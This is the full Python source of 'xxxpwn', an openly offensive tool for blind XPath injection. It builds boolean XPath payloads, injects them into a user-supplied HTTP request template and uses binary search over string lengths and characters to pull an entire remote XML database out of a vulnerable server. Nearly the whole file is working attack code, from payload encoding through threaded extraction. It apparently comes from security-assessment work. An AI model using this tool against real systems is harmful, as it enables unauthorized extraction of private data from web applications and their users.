#!/usr/bin/env python
# -*- coding: latin1 -*-
# Notepad++ : Encoding -> UTF-8 without BOM. Tabs used for indentation
#Developed by Paul Haas, <Paul dot J dot Haas at gmail dot com> under Security-Assessment
#Licensed under the GNU Public License version 3.0 (2013)

'''xxxpwn : XPath eXfiltration eXploitation Tool : https://github.com/feakk/xxxpwn
Designed for blind optimized XPath 1 injection attacks

xxxpwn uses a variety of XPath optimizations to query custom information from
a backend XML dodcument served from a location where XPath injection is present.
By default it will attempt to retrieve the entire remote database, though this
can be customized using a variety of options.

A number of previous discovered vulnerabilities have been provided as injection
files and target scripts for ease in getting started. This includes a sample
payload provided for the vulnerable application provided as part of xcat.py:
https://github.com/orf/xcat
'''

import argparse
import math
import re
import socket
import ssl
import string
import sys
import time
import urllib 
import cgi 
import xml.dom.minidom
import threading
import Queue
import binascii

# Global Variables #
VERSION = "1.0 kiwicon release"
ROOT_NODE='/*[1]' # Root node of a XML document
BAD_CHAR='?' # Character to return when we don't have a match in our character set
QI = Queue.Queue() # Input Queue
QO = Queue.Queue() # Output Queue
node_names = set([]) # Used for optimization of previous nodes
attribute_names = set([]) # Used for optimization of previous attributes
COUNT_OPTIMIZE = 30 # Optimize the character set if flag is enabled for any string larger than this. Best when over 30ish
root_nodes = root_comments = root_instructions = nodes_total = attributes_total = comments_total = instructions_total = text_total = elements_total = -1 # Used for optimization code


def get_count_bst(expression,high=16,low=0):
	'''BST Number Discovery: Start at half of high, double until too high, then check in middle of high and low, adjusting both as necessary.'''
	cmd = encode_payload("%s=0" % expression)
	node_test = attack(cmd)
	if node_test: return 0 # Expression is empty
	
	MAX_LENGTH = 10000
	TO_HIGH=False
	TO_LOW=False
	guess = (high + low)/2
	while guess!=low and guess!=high:
		if high >= MAX_LENGTH:
			sys.stderr.write("\n#Error: Surpassed max potential %s > %i#\n" % (expression,MAX_LENGTH))
			return MAX_LENGTH
			#return 0
		cmd = encode_payload("%s<%i" % (expression,guess))
		node_test = attack(cmd)
		if node_test:
			if not TO_LOW: low /= 2
			TO_HIGH=True
			high = guess
		else:
			if not TO_HIGH: high *= 2
			TO_LOW=True
			low = guess
		guess = (high + low)/2
	return guess
	
def encode_payload(payload):
	''' Used to encode our characters in our BST for get_character_bst function.'''
	global args
	if args.urlencode: # URL Encode
		payload = urllib.quote_plus(payload.encode('latin1'))
	if args.htmlencode: # URL encode key characters
		payload = cgi.escape(payload.encode('latin1'))
	return payload 
	

def get_character_queue(inputQueue, outputQueue):
	'''Function for handling an input and output Queue as a thread'''
	global args
	while True: 
		task = inputQueue.get()
		(node,position) = task
		char = get_character_bst(node,position,args.character_set)
		outputQueue.put((position,char))
		inputQueue.task_done()

def to_lower(node):
	global args
	if args.use_lowercase: 
		for r in string.uppercase: 
			node = node.replace(r,'')			
		node = 'translate(%s,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")' % node
	return node

def match_similar(node,node_set):
	'''Initially, compare our node to the set of all previously discovered nodes of its type.
	If we can write some XML-y intelligence, we should be able to use XML logic queries to speed this up even further
		For example, we can establish sibling relationships, then child-of relationships, etc
	'''
	global args
	match = node_set

	#If the number of potential nodes to compare is greater than the amount of time to get the length of the current node, then get the length first
	if len(match) > 9: 
		if args.normalize_space: node = 'normalize-space(%s)' % node
		count = get_count_bst("string-length(%s)" % node, args.len_high, args.len_low)
		
		match = [m for m in match if len(m) == count]
		#If after reducing our set to match we still have more than than the amount of time it takes to get a single character, then get the first character first
		if len(match) > 9:		
			value = ''
			for c in range(1,count+1):
				value += get_character_bst(node,c,args.character_set)
				match = [m for m in match if re.match(value,m)]
				if len(match) < 8:
					break
	
	for m in match:
		res = attack("%s='%s'" % (node,m))
		if res: return m
	return None # No match
	
	
def get_character_bst(node,position,chars=string.printable):
	'''Use BST by dividing across a character set until we find our matched character.'''	
	global args
	remove = "\x0b\x0c" # XPath doesn't support these 'printable' characters
	for r in remove: chars = chars.replace(r,'')
	node = to_lower(node)
	
	use_chars = chars # Manipulated to contain both " and ' for a valid XPath query
	SINGLE_QUOTE = "'"
	if SINGLE_QUOTE in use_chars:
		use_chars = use_chars.replace(SINGLE_QUOTE,"") + SINGLE_QUOTE # Move single quote to end so we don't have to deal with it
		chars = use_chars
		use_chars = """concat('%s',"'")""" % encode_payload(use_chars.replace(SINGLE_QUOTE,""))		
	else:
		use_chars = "'%s'" % encode_payload(use_chars)
	
	cmd = "contains(%s,substring(%s,%i,1))" % (use_chars,node,position)
	#print "Command: '%s'" % (cmd)
	res = attack(cmd)
	if not res:
		sys.stderr.write("\n#Error: %s at postion %i is not in provided character set#\n" % (node,position))
		sys.stdout.flush()
		return BAD_CHAR
	local_req = 1
		
	while len(chars) > 1:
		down = chars[:int(math.ceil(len(chars)/2))] # Bottom half of characters
		up = chars[int(math.floor(len(chars)/2)):]  # Top half of characters
		chars = down # Search bottom list
		use_chars = chars 
		
		if SINGLE_QUOTE in use_chars:
			use_chars = use_chars.replace(SINGLE_QUOTE,"") + SINGLE_QUOTE
			use_chars = """concat('%s',"'")""" % encode_payload(use_chars.replace(SINGLE_QUOTE,""))
		else:
			use_chars = "'%s'" % encode_payload(use_chars)
		
		cmd = "contains(%s,substring(%s,%i,1))" % (use_chars,node,position)
		res = attack(cmd)
		if not res: 
			chars = up
		local_req+=1

	return chars
	
def get_value_bst(node,count=None):
	'''Tie BST String-Length with BST Character Discovery and perform exception handling.'''
	global args # For args.character_set and args.normalize_space
	sys.stdout.flush()
	chars = args.character_set
	
	# TODO: Attempt pre-discovery stuff here, which somewhat implies we know what type 'node' is
	if args.normalize_space: node = 'normalize-space(%s)' % node
	if not count:
		count = get_count_bst("string-length(%s)" % node, args.len_high, args.len_low)
	
	if args.optimize_charset and count >= COUNT_OPTIMIZE: 
		chars = xml_optimize_character_set_node(node,chars)
	value = ''
	for c in range(1,count+1):
		if args.threads == 0: # Threading disabled
			value += get_character_bst(node,c,chars)			
		else: # Put each character on queue
			QI.put((node,c))

	if args.threads != 0:
		value = [BAD_CHAR] * count
		left = count
		while left > 0:
			# Block to prevent loop spinning
			tup = QO.get(True,None) 
			left -= 1
			value[tup[0]-1] = tup[1]
			QO.task_done()
		value = ''.join(value)
		
	return value

def get_xml_details():
	'''Get global XML details including content of root path.'''
	global root_nodes
	global root_comments
	global root_instructions
	global nodes_total
	global attributes_total
	global comments_total
	global instructions_total
	global text_total
	global elements_total
	global args
	
	xml_content = ''
	# Slight optimization here if the document is top heavy or doesn't contain certain node types
	root_nodes = get_count_bst("count(/*)")
	root_comments = get_count_bst("count(/comment())")
	root_instructions = get_count_bst("count(/processing-instruction())")
	
	if args.global_count:
		nodes_total = get_count_bst("count(//*)")
		attributes_total = get_count_bst("count(//@*)")
		comments_total = get_count_bst("count(//comment())")
		instructions_total = get_count_bst("count(//processing-instruction())")
		text_total = get_count_bst("count(//text())")
		elements_total = nodes_total + attributes_total + comments_total + text_total	
		print "### XML Details: Root Nodes: %i, Root Comments: %i, Root Instructions: %i, Total Nodes: %i, Attributes: %i, Comments: %i, Instructions: %i, Text: %i, Total: %i ###" % (root_nodes,root_comments, root_instructions, nodes_total, attributes_total, comments_total, instructions_total, text_total, elements_total)
	
	if args.no_root: return xml_content
	
	if args.no_comments != True:
		for c in range(1,root_comments+1):
			comments_total-=1
			comment = get_value_bst("/comment()[%s]" % (c))
			xml_content += ("<!--%s-->" % comment)
			sys.stdout.write("<!--%s-->" % comment)
	
	if args.no_processor != True:
		for i in range(1,root_instructions+1):
			instructions_total-=1
			instruction = get_value_bst("/processing-instruction()[%s]" % (i))
			xml_content += ("<?%s?>" % instruction)
			sys.stdout.write("<?%s?>" % instruction)
	
	return xml_content

def get_xml_bst(node=ROOT_NODE):
	'''Process an XML tree starting from a given node. If given the ROOT node, this will process an entire XML document.'''
	global args
	global root_nodes
	global root_comments
	global root_instructions
	global nodes_total
	global attributes_total
	global comments_total
	global instructions_total
	global text_total
	xml_content = ''
	if nodes_total == 0: return ''
	
	node_name = None
	if args.xml_match:
		node_name = match_similar("name(%s)" % node,node_names)
	if not node_name:
		node_name = get_value_bst("name(%s)" % node)
		node_names.add(node_name) # Add to set
		
	xml_content += ("<%s" % (node_name))
	sys.stdout.write("<%s" % (node_name.encode('latin1')))
	child_count = attribute_count = comment_count = instruction_count = text_count = 0

	if args.no_attributes != True:
		if attributes_total!=0: attribute_count = get_count_bst("count(%s/@*)" % node)
		for a in range(1,attribute_count+1):
			attributes_total-=1
			
			attribute_name = None
			if args.xml_match:
				attribute_name = match_similar("name(%s/@*[%i])" % (node,a),attribute_names)
			if not attribute_name:
				attribute_name = get_value_bst("name(%s/@*[%i])" % (node,a))
				attribute_names.add(attribute_name)
			
			if args.no_values != True:
				attribute_value = get_value_bst("%s/@*[%i]" % (node,a))
				xml_content += (' %s="%s"' % (attribute_name, attribute_value))
				sys.stdout.write(' %s="%s"' % (attribute_name.encode('latin1'), attribute_value.encode('latin1')))
			else:
				xml_content += (' %s' % (attribute_name))
				sys.stdout.write(' %s' % (attribute_name.encode('latin1')))
	xml_content += (">")
	sys.stdout.write(">")
	

	if args.no_comments != True:
		if comments_total!=0: comment_count = get_count_bst("count(%s/comment())" % node)
		for c in range(1,comment_count+1):
			comments_total-=1
			comment = get_value_bst("%s/comment()[%s]" % (node,c))
			xml_content += ("<!--%s-->" % comment)
			sys.stdout.write("<!--%s-->" % comment.encode('latin1'))
	
	if args.no_processor != True:
		if instructions_total!=0: instruction_count = get_count_bst("count(%s/processing-instruction())" % node)
		for i in range(1,instruction_count+1):
			nodes_total-=1
			instructions_total-=1
			instruction = get_value_bst("%s/processing-instruction()[%s]" % (node,i))
			xml_content += ("<?%s?>" % instruction)
			sys.stdout.write("<?%s?>" % instruction.encode('latin1'))

	if args.no_child != True:
		if nodes_total!=0: child_count = get_count_bst("count(%s/*)" % node)
		for c in range(1,child_count+1):
			xml_content += get_xml_bst("%s/*[%s]" % (node,c))
			nodes_total-=1

	if args.no_text != True:
		if text_total!=0: text_count = get_count_bst("count(%s/text())" % node)
		for t in range(1,text_count+1):
			text_total-=1
			text_value = get_value_bst("%s/text()[%i]" % (node,t))
			if re.search('\S',text_value,re.MULTILINE):
				xml_content += ("%s" % text_value)
				sys.stdout.write("%s" % text_value.replace('\n','').encode('latin1'))

	xml_content += ("</%s>" % (node_name))
	sys.stdout.write("</%s>" % (node_name))
	return xml_content

def xml_search(str):
	''' Enumerate over each type of node searching for a particular string.	'''
	global args

	# Needs to be quoted with single/double quotes
	str = "'%s'" % str
	name_node = 'name(.)'
	node = '.'
	match = 'contains'
	if args.search_start:
		match = 'starts-with'
		
	if args.use_lowercase: 
		str = str.lower()
		print "# Converting search string to lowercase %s #" % str
		name_node = '''translate(name(),"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")'''
		node = '''translate(.,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz")'''
		args.use_lowercase = False
 
	if args.no_child != True: # Use the no_child parameter for node names
		node_count = get_count_bst('count(//*[%s(%s,%s)])' % (match,name_node,str))
		print "### Found %s in %i node name(s) ###" % (str,node_count)
		for n in range(1,node_count+1):
			node_name = get_value_bst('(name((//*[%s(%s,%s)])[%i]))' % (match,name_node,str,n))
			print node_name
	
	if args.no_attributes != True:
		attribute_count = get_count_bst("count(//@*[%s(%s,%s)])" % (match,name_node,str))
		print "### Found %s in %i attribute name(s) ###" % (str,attribute_count)
		for a in range(1,attribute_count+1):
			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % (match,name_node,str,a))
			attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % (match,name_node,str,a))
			print '%s="%s"' % (attribute_name, attribute_value)
			
			''' # Assume they always want the value if they are searching for the name
			if args.no_values != True:
				attribute_value = get_value_bst('(//@*[%s(%s,%s)])[%i]' % (match,name_node,str,a))
				print '%s="%s"' % (attribute_name, attribute_value)
			else:
				print '%s' % (attribute_name)
			'''
			
	
	# Moved this block out of the no_attributes above in order to have distinct searches
	if args.no_values != True:
		attribute_count = get_count_bst("count(//@*[%s(%s,%s)])" % (match,node,str))
		print "### Found %s in %i attribute value(s) ###" % (str,attribute_count)
		for a in range(1,attribute_count+1):
			attribute_name = get_value_bst('(name((//@*[%s(%s,%s)])[%i]))' % (match,node,str,a))
			
			if args.no_values != True:
				attribute_value = get_value_bst('((//@*[%s(%s,%s)])[%i])' % (match,node,str,a))
				print '%s="%s"' % (attribute_name, attribute_value)
			else:
				print '%s' % (attribute_name)

	if args.no_comments != True:
		comment_count = get_count_bst("count(//comment()[%s(%s,%s)])" % (match,node,str))
		print "### Found %s in %i comments(s) ###" % (str,comment_count)
		for c in range(1,comment_count+1):
			comment = get_value_bst("(//comment()[%s(%s,%s)])[%i]" % (match,node,str,c))
			print "<!--%s-->" % comment
	
	if args.no_processor != True:
		instruction_count = get_count_bst("count(//processing-instruction()[%s(%s,%s)])" % (match,node,str))
		print "### Found %s in %i instruction(s) ###" % (str,instruction_count)
		for i in range(1,instruction_count+1):
			instruction = get_value_bst("(//processing-instruction()[%s(%s,%s)])[%i]" % (match,node,str,i))
			print "<?%s?>" % instruction

	if args.no_text != True:
		text_count = get_count_bst("count(//text()[%s(%s,%s)])" % (match,node,str))
		print "### Found %s in %i text(s) ###" % (str,text_count)
		for t in range(1,text_count+1):
			text = get_value_bst("(//text()[%s(%s,%s)])[%i]" % (match,node,str,t))
			print "%s" % text


def xml_optimize_character_set_node(node,chars):
	present = ''
	for c in chars:
		if c == "'":
			cmd = 'contains(%s,"%s")' % (node,c)
		else:
			cmd = "contains(%s,'%s')" % (node,c)
		if attack(encode_payload(cmd)):
			present += c
	return present
			
def xml_optimize_character_set(chars=string.printable):
	''' Optimize a character set by searching globally for each character in the database '''
	global args

	remove = "\x0b\x0c" # XPath doesn't support these 'printable' characters
	for r in remove: chars = chars.replace(r,'')

	present = ''
	for c in chars:
		if c == "'":
			cmd = '//*[contains(name(),"%s")] or //*[contains(.,"%s")] or //@*[contains(name(),"%s")] or //@*[contains(.,"%s")] or //comment()[contains(.,"%s")] or //processing-instruction()[contains(.,"%s")] or //text()[contains(.,"%s")]' % (c,c,c,c,c,c,c)
		else:
			cmd = "//*[contains(name(),'%s')] or //*[contains(.,'%s')] or //@*[contains(name(),'%s')] or //@*[contains(.,'%s')] or //comment()[contains(.,'%s')] or //processing-instruction()[contains(.,'%s')] or //text()[contains(.,'%s')]" % (c,c,c,c,c,c,c)
		if attack(encode_payload(cmd)):
			present += c
	
	sys.stdout.write("### Match set optimized from %i to %i characters: %s ###\n" % (len(chars),len(present),repr(present)))
	return present
		

def attack(inject):
	''' Parses injection request, passes to socket, and attempts to match response.'''
	global args
	global REQUEST_COUNT

	request = re.sub(r"\$INJECT", inject, args.inject_file)
	# Automatically Update Host header if present
	if re.search('Host:', request, args.match_case):
		request = re.sub(r"Host:\s*\S*", 'Host: %s' % args.host, request, args.match_case)
	# Change Accept-Encoding header value to none if present - DC 4/14/14
	if re.search('Accept-Encoding:', request, args.match_case):
		request = re.sub(r"Accept-Encoding:\s*.*", 'Accept-Encoding: none', request, args.match_case)
	# Change Connection header value to close if present - DC 4/24/14
	if re.search('Connection:', request, args.match_case):
		request = re.sub(r"Connection:\s*.*", 'Connection: close', request, args.match_case)
	else:
		# Add Connection: close if no Connection header is present
		request = re.sub(r'(.*?)(\r?\n){2}(.*)', r'\1\2Connection:close\2\2\3', request, 1, re.MULTILINE|re.DOTALL)
	# If Content-Length is present, assume HTTP and automatically update
	if re.search('Content-Length:', request, args.match_case):
		# Split head and content, matching HTTP newline variants of \r and \n
		match = re.search(r'(.*?)\r?\n\r?\n(.*)', request, re.MULTILINE|re.DOTALL)
		if match:
			content_len = len(match.groups()[1])
			request = re.sub(r"Content-Length:\s*[0-9]*", 'Content-Length: %i' % content_len, request, args.match_case)
	
	MAX = 10 # Number of retries
	s = None
	while not s:
		try:			
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			ip = socket.gethostbyname(args.host)
			if args.use_ssl: s = ssl.wrap_socket(s)
			s.connect((ip, args.port))
			#s.setblocking(0)
			s.send(request)
		except Exception as e:
			if MAX == 0:
				sys.stderr.write("### Max retries reached ###\n")
				raise e
			else:
				sys.stderr.write("### Connection Retry %i ###\n" % MAX)
			MAX -= 1
			s = None
			time.sleep(1)
	REQUEST_COUNT+=1 # Bump our global request count
	
	total = ''
	# TODO: we need a max time to read data, and a timeout for nonblocking
	# TODO: Use keep-alive to speed up this code, which will however require a rearchitecture and some processing for HTTP POST data size reading
	while True:
		data = s.recv(65534)
		if not data: break
		total += data
	data = total
	s.close()	
	
	found = bool(re.search(args.match, data, args.match_case))	
	if args.example: print "### Request: ###\n%s\n### Reply: ###\n%s\n### Match: '%s' = %s ###\n" % (request,data,args.match,found)
	return found
	

if __name__ == "__main__":
	t1 = time.time()
	global REQUEST_COUNT
	REQUEST_COUNT = 0
	
	global args
	# http://docs.python.org/dev/library/argparse.html
	parser = argparse.ArgumentParser(prog='xxxpwn',description="Read a remote XML file through an XPath injection vulnerability using optimized Binary Search Tree (BST) requests")
	parser.add_argument("-v", "--version", help="Show version of %(prog)s", action='version', version=VERSION)
	parser.add_argument("-c", "--case", help="Perform case-sensitive string matches (default=insensitive)", dest="match_case", action='store_const', const=0, default=re.IGNORECASE)
	parser.add_argument("-U", "--urlencode", help="URL encode key characters in payload (default=disabled)", dest="urlencode", action="store_true", default=False)
	parser.add_argument("-H", "--htmlencode", help="HTML Encode key characters in payload (default=disabled)", dest="htmlencode", action="store_true", default=False)
	parser.add_argument("-s", "--ssl", help="Use SSL for connection (default=off)", dest="use_ssl", action="store_true", default=False)
	parser.add_argument("-i", "--inject", help="REQUIRED: File containing sample request with $INJECT as dynamic injection location (default=stdin)", type=argparse.FileType('rb'), default=sys.stdin, dest="inject_file", required=True)
	parser.add_argument("-m", "--match", help="REQUIRED: Keyword that is present on successful injection", dest="match", required=True)
	parser.add_argument("host", action="store")
	parser.add_argument("port", action="store", type=int)
	
	group_test = parser.add_argument_group('Test options')
	group_test.add_argument("-e", "--example", help="Test injection with an example injection request", dest="example")
	group_test.add_argument("--summary", help="Print XML summary information only", dest="summary", action="store_true", default=False)
	group_test.add_argument("--no_root", help="Disable accessing comments/instructions in root (default=enabled)", dest="no_root", action="store_true", default=False)
	group_test.add_argument("--no_comments", help="Disable accessing comments/instructions in retrieval (default=enabled)", dest="no_comments", action="store_true", default=False)
	group_test.add_argument("--no_processor", help="Disable accessing comments nodes (default=enabled)", dest="no_processor", action="store_true", default=False)
	group_test.add_argument("--no_attributes", help="Disable accessing attributes (default=enabled)", dest="no_attributes", action="store_true", default=False)
	group_test.add_argument("--no_values", help="Disable accessing attribute values (default=enabled)", dest="no_values", action="store_true", default=False)
	group_test.add_argument("--no_text", help="Disable accessing text nodes (default=enabled)", dest="no_text", action="store_true", default=False)
	group_test.add_argument("--no_child", help="Disable accessing child nodes (default=enabled)", dest="no_child", action="store_true", default=False)
	
	group_adv = parser.add_argument_group('Advanced options')
	group_adv.add_argument("-l", "--lowercase", help="Optimize further by reducing injection to lowercase matches (default=off)", dest="use_lowercase", action="store_true", default=False)
	group_adv.add_argument("-g", "--global_count", help="Maintain global count of nodes", dest="global_count", action="store_true", default=False)
	group_adv.add_argument("-n", "--normalize_space", help="Normalize whitespace (default=off)", dest="normalize_space", action="store_true", default=False)
	group_adv.add_argument("-o", "--optimize_charset", help="Optimize character set globally and for any string length over %i" % COUNT_OPTIMIZE, dest="optimize_charset", action="store_true", default=False)
	group_adv.add_argument("-x", "--xml_match", help="Match current nodes to previously recovered data", dest="xml_match", action="store_true", default=False)
	group_adv.add_argument("--len_low", help="Low value for string length matching (default=0)", type=int, dest="len_low", default=0)
	group_adv.add_argument("--len_high", help="Start high value for string length matching (default=16)", type=int, dest="len_high", default=16)
	group_adv.add_argument("--start_node", help="Start recovery at given node (default=ROOT_NODE or /*[1])", dest="start_node", default=ROOT_NODE)
	#group_adv.add_argument("-k", "--keep_alive", help="Use HTTP Keep Alives connections to speedup round-trip time", dest="keep_alive", action="store_true", default=False)	
	group_adv.add_argument("-u", "--use_characters", help="Use given string for BST character discovery (default=string.printable)", dest="character_set", default=string.printable)
	group_adv.add_argument("--unicode", help="Include Unicode characters to search space", dest="unicode", action="store_true", default=False)
	group_adv.add_argument("-t", "--threads", help="Parallelize attack using specified threads (default=1)", dest="threads", type=int, default=0)
	group_adv.add_argument("--xpath2", help="Check for presence of XPath 2.0 functions", dest="xpath2", action="store_true", default=False)
	group_adv.add_argument("--search", help="Print all string matches (use -l for case-insensitive)", dest="search")
	group_adv.add_argument("--search_start", help="Search only at start of node", dest="search_start", action="store_true", default=False)
	
	try:
		args = parser.parse_args()
	except IOError as e:
		sys.stderr.write("Error: Cannot access injection file: %s\n" % e)
		exit(2)
	except Exception as e:
		sys.stderr.write("Error: Invalid command arguments: %s\n" % e)
		exit(3)
	args.inject_file = args.inject_file.read() # Convert file object to string
	if not re.search('\$INJECT', args.inject_file, args.match_case):
		sys.stderr.write("### Error: Could not find '$INJECT' string in provided content: ###\n%s" % args.inject_file)
		exit(4)
	if args.len_low > args.len_high or args.len_low == args.len_high:
		sys.stderr.write("### Invalid character length matching parameters. Must be set as $i < $i: ###\n%s" % (args.len_low,args.len_high))
		exit(5)
	if args.use_lowercase:
		for r in string.uppercase: args.character_set = args.character_set.replace(r,'')
	if args.example:
		print "### Testing %s ###" % args.example
		args.no_child = True
		attack(encode_payload(args.example))
		exit(0)
#Developed by Paul Haas, <phaas AT redspin DOT com> under Redspin. Inc.
#Licensed under the GNU Public License version 3.0 (2008-2009)
	# Test injection point for successful injection before performing attack
	if not attack(encode_payload("count(//*) and 2>1")):
		sys.stderr.write("### Test Injection Failed to match '%s' using: ###\n%s\n" % (args.match, args.inject_file))
		sys.stderr.write("### If you know injection location is correct, please examine use of -U and -H flags###\n")
		exit(6)
	# Verify that bad injection is not accepted
	if attack(encode_payload("0>1")):
		sys.stderr.write("### Matched '%s' using invalid XPath request on:###\n%s\n" % (args.match, args.inject_file))
		sys.stderr.write("### If you know injection location is correct, please examine use of -U and -H flags###\n")
		exit(7)		
	# Test for XPath 2.0 functionality
	if args.xpath2:
		if attack(encode_payload("lower-case('A')='a'")):
			sys.stderr.write("### Looks like %s:%i supports XPath 2.0 injection via lower-case(), consider using xcat (https://github.com/orf/xcat) ###\n" % (args.host, args.port))
			exit(8)
	
	if args.unicode:
		# Some editors will complain about the Unicode string below.. use a better editor
		unicode_str = ''.join(set(u"ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ"))
		sys.stdout.write("### Adding %i Unicode characters to character set of length %i ###\n" % (len(unicode_str),len(args.character_set)))
		args.character_set += unicode_str
	if args.optimize_charset:		
		args.character_set = xml_optimize_character_set(args.character_set)
	args.character_set = ''.join(set(args.character_set)) # Eliminate duplicates in our set
	
	# Start threads
	thread_lst = []
	for i in range(args.threads):
		t = threading.Thread(target=get_character_queue, args = (QI,QO))
		t.daemon = True
		t.start()
		thread_lst.append(t)

	if args.search:
		print "### Searching globally for %s ###" % args.search
		xml_search(args.search)
		exit(0)	
		
	# Start our XML Content with an empty string
	if not args.summary: print "\n### Raw XML ####:"
	xml_content = ''
	xml_content += get_xml_details()	
	
	if not args.summary:
		xml_content += get_xml_bst(args.start_node)
		xml_content = str(xml_content.encode('latin1'))
		print "\n\n### Parsed XML ####:"
		try:
			# Warning The xml.dom.minidom module is not secure against maliciously constructed data.
			# This parses improperly in either Windows or Linux. I'm not dealing with encoding issues in Python
			print xml.dom.minidom.parseString(xml_content).toprettyxml(encoding='utf-8')
		except xml.parsers.expat.ExpatError as e:
			sys.stderr.write("### Unable to process as complete XML document '%s', re-printing raw XML###\n" % e)
			print xml_content

		if args.global_count:
			print "### XML Elements Remaining: Nodes: %i, Attributes: %i, Comments: %i, Instructions: %i, Text: %i ###" % (nodes_total,attributes_total,comments_total,instructions_total,text_total)

	t2 = time.time()
	sys.stderr.write("### %i requests made in %.2f seconds (%.2f req/sec) ###\n"% (REQUEST_COUNT,(t2-t1),REQUEST_COUNT/(t2-t1)))


